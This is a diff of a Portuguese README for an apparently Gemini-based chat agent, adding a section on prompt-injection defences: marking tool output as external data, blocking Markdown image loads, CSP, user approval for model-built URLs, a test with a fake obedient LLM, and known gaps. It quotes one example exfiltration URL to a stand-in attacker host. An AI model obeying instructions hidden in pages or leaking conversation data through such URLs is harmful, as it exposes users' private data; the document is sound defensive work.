@@ -38,7 +38,7 @@ Abra http://localhost:5173.
 
 ## Testes
 
-São 83 arquivos de teste unitário e de integração (Vitest) e 15 specs ponta a ponta (Playwright),
+São 91 arquivos de teste unitário e de integração (Vitest) e 16 specs ponta a ponta (Playwright),
 que rodam no CI antes de todo deploy.
 
 A organização da suíte Vitest, os dublês, a cobertura mínima e as convenções estão em
@@ -54,6 +54,8 @@ Gemini. Cobrem:
 - anexos de imagem e PDF, com o rascunho preservado ao trocar de conversa e ao recarregar a página;
 - compactação automática do histórico;
 - tools (busca e scraping), preferências e auditoria de cada execução;
+- prompt injection: imagem na resposta, e pedido de autorização quando uma página manda o agente
+  abrir um endereço com dados da conversa;
 - créditos, rate limit e turnos simultâneos;
 - resposta bloqueada pelo modelo;
 - leitura da resposta sem rolagem automática;
@@ -141,11 +143,11 @@ link vê as mensagens e os anexos, inclusive as mensagens enviadas depois, mas n
   várias páginas de uma vez; as que passam do limite esperam a vez.
 - **Resposta bloqueada.** Se o Gemini barrar a resposta por segurança ou cortá-la pelo limite de
   saída, o usuário recebe o motivo e a falha vai para a auditoria.
-- **Prompt injection.** Resultados de tools com conteúdo de terceiros
-  chegam ao modelo marcados como externos, e o system prompt manda tratá-los como dado, nunca como
-  instrução. Coberto por um spec `@live`.
+- **Prompt injection.** Conteúdo de terceiros é marcado como dado, e os caminhos por onde os
+  dados da conversa sairiam estão fechados ou dependem do usuário. Detalhes e limites conhecidos
+  na seção [Prompt injection](#prompt-injection).
 - **Scraping.** Só endereços públicos: bloqueia rede interna, metadados do GCP e DNS rebinding, com
-  limites de tempo e tamanho.
+  limites de tempo e tamanho. Endereços que o usuário não enviou esperam a autorização dele.
 
 **Identidade do modelo.** O modelo não sabe a própria versão: perguntado, o Gemini 3.8 Flash
 respondia "Gemini 3.7 Flash", a versão presente nos dados de treino. O system prompt informa o
@@ -153,6 +155,54 @@ modelo configurado, e o consumo registra a versão que o Agent Platform diz ter 
 
 **Fora do escopo, por decisão.** Moderação da entrada e configuração explícita dos filtros de
 segurança do Gemini: os filtros padrão do Agent Platform continuam ativos.
+
+## Prompt injection
+
+Páginas, resultados de busca e arquivos podem trazer instruções escondidas para o modelo. Nenhuma
+defesa garante que ele não as obedeça. Por isso há duas camadas: a primeira diminui a chance de o
+modelo obedecer; a segunda limita o que uma injeção bem-sucedida consegue fazer, e vale mesmo com
+o modelo enganado.
+
+**Diminuir a chance de o modelo obedecer**
+
+- Resultados de tools com conteúdo de terceiros chegam ao modelo marcados como externos, e o
+  system prompt manda tratá-los como dado, nunca como instrução. Um spec `@live` confere isso
+  contra o Gemini real, com um ataque simples. É uma defesa probabilística: reduz, não impede.
+
+**Limitar o dano quando ele obedece**
+
+O agente só tem tools de leitura, então o dano possível é o vazamento do que está na conversa.
+Os caminhos que não dependem de clique do usuário estão fechados:
+
+- **Imagem na resposta.** Imagens em Markdown aparecem como link e não são carregadas. O navegador
+  buscaria `![](https://atacante/?d=<dados>)` sozinho.
+- **CSP.** As páginas só carregam conteúdo e fazem requisições para a própria origem.
+- **Leitura de endereço montado pelo modelo.** `web_scrape` lê direto os endereços que o usuário
+  escreveu na conversa e as fontes devolvidas pela busca. Qualquer outro foi montado pelo modelo:
+  o turno para e o usuário vê o endereço inteiro antes de permitir ou negar.
+- **Autorização como regra das tools.** Cada tool diz quais chamadas dependem do usuário
+  (`requiresApproval`). O turno grava o pedido e termina; a decisão chega em outra requisição e o
+  retoma a partir do histórico, então vale entre instâncias e depois de recarregar a página.
+  Pedido e decisão vão para a auditoria. Tools que escrevem ou enviam algo (MCP, Drive, Gmail)
+  entram por essa regra.
+
+O spec e2e `prompt-injection.spec.ts` usa um LLM falso que obedece à instrução escondida numa
+página: com a injeção funcionando, o endereço do atacante só recebe a requisição se o usuário
+permitir.
+
+**Limites conhecidos**
+
+- **Anexos.** PDFs e imagens entram como conteúdo do usuário, sem a marca de externo. Um arquivo de
+  terceiros com instruções escondidas tem mais autoridade que uma página.
+- **Resumo da compactação.** Uma instrução que entre no resumo passa a fazer parte do system prompt
+  dos turnos seguintes.
+- **Links.** Um link na resposta pode levar dados no endereço. Só sai algo se o usuário clicar.
+- **Resposta manipulada.** Uma página pode fazer o modelo responder com informação errada. Não há
+  verificação do conteúdo da resposta.
+- **Busca.** O texto da consulta, escrito pelo modelo, vai para o buscador do Google. O resumo que
+  volta é gerado por um LLM que leu páginas de terceiros.
+- **Autorização.** Depende de o usuário ler o pedido. Pedidos demais levam a permitir sem olhar;
+  por isso os endereços que o próprio usuário enviou não perguntam.
 
 ## Desempenho
 
